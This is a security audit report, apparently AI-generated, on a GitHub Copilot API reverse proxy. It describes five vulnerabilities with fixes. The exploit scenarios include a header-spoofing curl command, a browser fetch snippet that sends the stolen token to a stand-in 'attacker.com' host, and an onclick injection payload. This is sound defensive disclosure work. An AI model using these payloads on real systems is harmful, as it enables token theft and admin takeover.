# Security Audit Report: copilot-api

**Repository:** copilot-api (GitHub Copilot API reverse proxy)
**Date:** 2026-04-11
**Scope:** Full codebase review for local deployment security
**Auditor:** Claude Code (automated security review)

---

## Executive Summary

5 high-confidence vulnerabilities were identified across authentication bypass, cross-site scripting, token exposure, and CORS misconfiguration. When chained together, these allow a remote attacker to **steal your GitHub Copilot token** and **take over the admin panel** without any authentication.

---

## Vuln 1: Admin Localhost Bypass via Header Spoofing

**File:** `src/routes/admin/middleware.ts:12-37`
**Severity:** HIGH | **Confidence:** 9/10 | **Category:** `authentication_bypass`

### Description

The admin middleware restricts access to localhost by checking `X-Forwarded-For` and `X-Real-IP` headers — both trivially spoofable by any client. The server binds to `0.0.0.0` (all interfaces) by default since `srvx`'s `serve()` is called without a hostname. No actual socket/connection IP is ever checked.

### Exploit Scenario

```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://<target>:4141/admin/api/accounts
```

This bypasses the localhost restriction entirely, granting full admin access from any network — adding/removing accounts, switching active tokens, modifying model mappings.

### Fix

**Step 1 — Bind the server to loopback only** (`src/main.ts`):

```typescript
serve({
  fetch: server.fetch as ServerHandler,
  port: PORT,
  hostname: "127.0.0.1",  // ADD THIS — prevents remote connections entirely
  bun: { idleTimeout: 0 },
})
```

**Step 2 — Fix the middleware to check actual connection IP** (`src/routes/admin/middleware.ts`):

```typescript
export const localOnlyMiddleware: MiddlewareHandler = async (c, next) => {
  // Check the real socket address — NOT spoofable proxy headers
  const clientIP = c.env?.remoteAddress ?? ""
  const allowedIPs = ["127.0.0.1", "::1", "::ffff:127.0.0.1", "localhost"]
  if (!allowedIPs.includes(clientIP)) {
    return c.json({ error: "Forbidden" }, 403)
  }
  await next()
}
```

---

## Vuln 2: Unprotected `/token` Endpoint Exposes Copilot Token

**File:** `src/routes/token/route.ts:6-16`
**Severity:** HIGH | **Confidence:** 9/10 | **Category:** `sensitive_data_exposure`

### Description

The `/token` endpoint returns `state.copilotToken` as plain JSON with zero authentication. This endpoint is **not** behind the admin middleware. Any client with network access can retrieve the active Copilot API token.

### Exploit Scenario

```bash
curl http://<target>:4141/token
# Response: {"token": "ghu_xxxx..."}
```

The attacker now holds a valid Copilot token and can make authenticated requests to GitHub Copilot's API, consuming the victim's quota and accessing Copilot services.

### Fix

Either remove this endpoint entirely (preferred), or protect it with the admin middleware:

```typescript
// src/routes/token/route.ts
import { localOnlyMiddleware } from "~/routes/admin/middleware"

tokenRoute.use("*", localOnlyMiddleware)

tokenRoute.get("/", (c) => {
  return c.json({ token: state.copilotToken })
})
```

---

## Vuln 3: Unrestricted Global CORS Enables Cross-Origin Token Theft

**File:** `src/server.ts:17`
**Severity:** HIGH | **Confidence:** 9/10 | **Category:** `cors_misconfiguration`

### Description

`cors()` is applied globally with no origin restriction, defaulting to `Access-Control-Allow-Origin: *`. Combined with Vuln 2, any website the user visits can silently exfiltrate the Copilot token via JavaScript.

### Exploit Scenario

Attacker hosts a page with:

```javascript
// Hosted on any domain — works because CORS allows all origins
fetch('http://localhost:4141/token')
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?t=' + d.token))
```

When a victim with copilot-api running visits this page, their Copilot token is stolen silently.

### Fix

Restrict CORS to only trusted local origins (`src/server.ts`):

```typescript
import { cors } from "hono/cors"

server.use(cors({
  origin: ["http://localhost:4141", "http://127.0.0.1:4141"],
}))
```

---

## Vuln 4: Stored DOM XSS via Unsafe HTML Rendering in Admin UI

**File:** `src/routes/admin/html.ts:400-407, 570-576`
**Severity:** HIGH | **Confidence:** 10/10 | **Category:** `xss`

### Description

The admin panel builds HTML by concatenating unescaped user-controlled strings and assigning them to the DOM's `innerHTML` property. Data from three untrusted sources flows directly into HTML:

- **`acc.login`, `acc.avatarUrl`, `acc.accountType`** — fetched from GitHub's API, controlled by any GitHub user
- **Model mapping `from`/`to` keys** — direct user input stored to config, then rendered

The current pattern (lines 400-407, 570-576) concatenates these raw values into HTML strings then sets `element.innerHTML = ...`, creating both reflected and stored XSS vectors.

### Exploit Scenario

1. Attacker creates a GitHub account with a malicious `login` username containing an injected tag
2. Victim adds the attacker's account via the device code flow in the admin UI
3. When the admin UI fetches and renders the account list, the injected payload executes
4. Payload can exfiltrate all account tokens, modify settings, or install a persistent backdoor in the config

For model mappings: a malicious mapping key stored via the API persists in `config.json` and executes on every admin page load (stored XSS).

### Fix

**Add an HTML escape function and apply it to every user-controlled value:**

```typescript
// src/routes/admin/html.ts — add this helper
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;")
}

// Apply to every interpolated value:
// acc.login       → escapeHtml(acc.login)
// acc.avatarUrl   → escapeHtml(acc.avatarUrl)
// acc.accountType → escapeHtml(acc.accountType)
// from, to        → escapeHtml(from), escapeHtml(to)
```

**Even better — use DOM APIs to avoid innerHTML entirely:**

```javascript
const div = document.createElement('div')
div.textContent = acc.login   // safe: no HTML interpretation
container.appendChild(div)
```

---

## Vuln 5: JavaScript Injection via onclick String Concatenation

**File:** `src/routes/admin/html.ts:405-406, 574`
**Severity:** HIGH | **Confidence:** 10/10 | **Category:** `xss`

### Description

Onclick handlers are constructed by concatenating unescaped user data into JavaScript event attribute strings. An attacker who controls `acc.login`, `acc.id`, or model mapping keys can break out of the quoted string and inject arbitrary JavaScript.

Pattern at lines 405-406:
```
onclick="switchAccount('<USER_CONTROLLED_ID>')"
onclick="deleteAccount('<USER_CONTROLLED_ID>', '<USER_CONTROLLED_LOGIN>')"
```

Pattern at line 574:
```
onclick="deleteMapping('<USER_CONTROLLED_MAPPING_KEY>')"
```

### Exploit Scenario

A model mapping key of `');alert(document.cookie);//` renders the attribute as:
```
onclick="deleteMapping('');alert(document.cookie);//')"
```
This executes `alert(document.cookie)` (or any payload) when the button is clicked.

### Fix

Replace inline onclick string concatenation with `data-*` attributes and `addEventListener`:

```javascript
// INSTEAD OF: onclick="deleteMapping('" + from + "')"
// USE: data attributes with proper escaping

'<button class="delete-mapping-btn" data-from="' + escapeHtml(from) + '">'

// Wire up in script section — safe, no injection possible:
document.addEventListener('click', (e) => {
  const btn = e.target.closest('.delete-mapping-btn')
  if (btn) {
    deleteMapping(btn.dataset.from)   // value retrieved from DOM, not eval'd
  }
})
```

Apply the same pattern for `switchAccount` and `deleteAccount` buttons.

---

## Attack Chain Summary

```
Remote Attacker
  │
  ├─► Vuln 1: Spoof "X-Forwarded-For: 127.0.0.1"
  │     └──► Full admin access from any network
  │
  ├─► Vuln 3 (Open CORS) + Vuln 2 (Unauthenticated /token)
  │     └──► Any website silently steals the Copilot token via browser fetch
  │
  └─► Vuln 4 + 5: XSS via unsafe HTML rendering + onclick injection
        └──► Persistent code execution in admin panel
              └──► Exfiltrate all accounts, tokens, config
```

---

## Remediation Priority

| Priority | # | File | What to do | Effort |
|----------|---|------|-----------|--------|
| **P0** | 1 | `src/main.ts` | Add `hostname: "127.0.0.1"` to `serve()` | ~1 line |
| **P0** | 2 | `src/routes/token/route.ts` | Add `localOnlyMiddleware` guard | ~3 lines |
| **P0** | 3 | `src/server.ts` | Restrict `cors()` to localhost origins | ~3 lines |
| **P1** | 4 | `src/routes/admin/html.ts` | Add `escapeHtml()` and apply to all interpolated values | Medium |
| **P1** | 5 | `src/routes/admin/html.ts` | Replace `onclick` string concat with `data-*` + `addEventListener` | Medium |

---

## Dismissed Findings

| Finding | Reason |
|---------|--------|
| accountType SSRF | Confidence 2/10 — code validates `accountType` against strict allowlist before URL construction |
| Token logging via `SHOW_TOKEN` | Out of scope — secrets in logs handled by separate process |
| Missing rate limiting on admin | Out of scope — rate limiting / resource exhaustion excluded |
| CSRF on admin endpoints | Low impact when Vuln 1 is fixed; SameSite cookies mitigate further |
